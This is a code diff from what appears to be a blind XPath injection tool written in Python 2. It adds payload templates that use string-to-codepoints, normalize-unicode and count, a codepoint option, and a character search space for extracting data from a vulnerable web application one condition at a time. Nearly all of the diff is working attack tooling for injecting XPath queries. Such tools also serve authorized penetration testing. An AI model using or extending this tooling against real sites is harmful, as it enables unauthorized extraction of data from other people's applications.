@@ -11,11 +11,12 @@ import urlparse
 import urllib
 
 class Payload(object):
-    def __init__(self, payload, can_lower=False, normalization=False):
+    def __init__(self, payload, can_lower=False, normalization=False, takes_codepoints=False):
         self.payload = string.Template(payload)
 
         self.can_lower = can_lower
         self.normalization = normalization
+        self.takes_codepoints = takes_codepoints
 
     def replace(self, char, newchar):
         self.payload = string.Template(self.payload.template.replace(char, newchar))
@@ -24,11 +25,17 @@ class Payload(object):
     def Create(self, parent):
         output = self.payload
         if parent.config.xversion == "2":
-            if parent.config.normalize_unicode and self.can_lower:
-                output = string.Template(output.safe_substitute(node=parent.PAYLOADS["WRAP_UNICODE"].GetString()))
+            if self.takes_codepoints:
+                output = string.Template(output.safe_substitute(node=parent.PAYLOADS["STRING-TO-CODEPOINTS"].GetString()))
+                print "Output (codepoints): %s"%output.template
 
-            if parent.config.lowercase and self.normalization:
+            if parent.config.normalize_unicode and self.normalization:
+                output = string.Template(output.safe_substitute(node=parent.PAYLOADS["WRAP_UNICODE"].GetString()))
+                print "Output (norm): %s"%output.template
+
+            if parent.config.lowercase and self.can_lower:
                 output = string.Template(output.safe_substitute(node=parent.PAYLOADS["WRAP_LOWERCASE"].GetString()))
+                print "Output (lower): %s"%output.template
 
         return string.Template(parent.BASE.substitute(payload=output.safe_substitute()))
 
@@ -53,8 +60,8 @@ class PayloadMaker(object):
         "WRAP_UNICODE"         : WrapperPayload("normalize-unicode($node)"),
         "STRING-TO-CODEPOINTS" : WrapperPayload("string-to-codepoints($node)"),
 
-        "GET_NODE_CODEPOINT"   : Payload("string-to-codepoints($node)[$count]=$value"),
-        #"GET_CODEPOINT_LENGTH" : Payload("(string-to-codepoints($node)[$count] > $min and string-to-codepoints($node)[$count] <= $max", can_lower=True, normalization=True),
+        "GET_NODE_CODEPOINT"   : Payload("string-to-codepoints($node)[$index]=$count", can_lower=True, normalization=True),
+        "GET_CODEPOINT_LENGTH" : Payload("(string-to-codepoints($node)[$index] > $min and string-to-codepoints($node)[$index] <= $max)", can_lower=True, normalization=True),
         "GET_NODE_SUBSTRING"   : Payload("substring($node,$count,1)='$character'", can_lower=True, normalization=True),
 
         "NODEVALUE_LENGTH"     : Payload("string-length($node)=$count", can_lower=True, normalization=True),
@@ -63,11 +70,16 @@ class PayloadMaker(object):
         #"GET_COUNT_LENGTH_STR" : Payload("(count($node) > $min and count($node) <= $max)", can_lower=True, normalization=True),
         "GET_COUNT_LENGTH"     : Payload("(count($node) > $min and count($node) <= $max)"),
         "NODE_COUNT"           : Payload("count($node)=$count"),
+
+        "GET_COUNT_LENGTH_U"   : Payload("(count($node) > $min and count($node) <= $max)", can_lower=True, normalization=True, takes_codepoints=True),
+        "NODE_COUNT_U"         : Payload("count($node)=$count", can_lower=True, normalization=True, takes_codepoints=True),
+
         }
 
 
     def __init__(self, config):
         self.config = config
+        self.search_space = string.ascii_letters + string.digits + " "
         self.agent = Agent(reactor)
 
         self._headers = Headers({"User-Agent":[config.user_agent]})
@@ -110,6 +122,12 @@ class PayloadMaker(object):
         else:
             defer.returnValue(self.config.false_keyword in content)
 
+
+    def GetSearchSpace(self):
+        return self.search_space
+
+    def SetSearchSpace(self, space):
+        self.search_space = space
 
     @defer.inlineCallbacks
     def DetectXPathVersion(self):
